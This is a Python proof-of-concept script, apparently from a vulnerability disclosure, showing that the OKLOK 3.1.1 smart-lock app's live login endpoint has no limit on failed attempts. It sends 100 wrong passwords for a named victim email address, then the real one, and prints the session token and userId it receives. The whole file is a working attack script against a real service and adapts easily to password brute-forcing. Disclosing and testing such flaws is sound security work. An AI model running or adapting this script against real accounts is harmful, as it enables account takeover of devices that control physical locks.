#!/usr/bin/env python3

#Demo "CWE-307: Improper Restriction of Excessive Authentication Attempts" in the OKLOK 3.1.1 mobile app

import requests
import json
import sys
import getpass
import itertools
import datetime

#login to the victim account after 100 consecutive attempts
def login_victim(victim_email_address, real_password):
		
	url = 'https://app.oklok.com.cn/oklock/user/loginByPassword'

	headers = {'Host': 'app.oklok.com.cn',
	'Content-Type': 'application/json',
	'Connection': 'keep-alive',
	'Accept': '*/*',
	'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
	'Accept-Language': 'en-US;q=1',
	'Content-Length': '70',
	'Accept-Encoding': 'gzip, deflate, br'}

	print('\n-------------------------------------------------------------')
	print('Attempting to log in...')

	count = 0
	for i in range(0, 100):
		count += 1
		password = "password" + str(i)
		print(password)
		body = {"code":password,"account":victim_email_address,"type":"0"}
		response = requests.post(url, data=json.dumps(body), headers=headers)

	count += 1
	password = real_password
	print(password)
	body = {"code":real_password,"account":victim_email_address,"type":"0"}
	response = requests.post(url, data=json.dumps(body), headers=headers)
	json_resp = response.json()
	status = json_resp['status']
	if status == '2000':
		print(f'Successful login after {count} tries!\n')
		print('Login Details:')
		print('password: ' + password)
		result = json_resp['result']
		token = result['token']
		userId = result['userId']
		print('token: ' + str(token))
		print('userId: ' + str(userId))
		print('-------------------------------------------------------------\n')

	else:
		sys.exit('Login not successful.')


def main():

	start_time = datetime.datetime.now()

	if len(sys.argv) is not 2:
		sys.exit('Usage: python3 ownklok_bf.py <victim_email_address>')
	else:
		victim_email_address = sys.argv[1]
		real_password = getpass.getpass('Real Password: ')

	login_victim(victim_email_address, real_password)

	end_time = datetime.datetime.now()

	total_time = end_time - start_time

	print('Total Execution Time: ' + str(total_time))
	print('-------------------------------------------------------------\n')


if __name__ == '__main__':
	main()

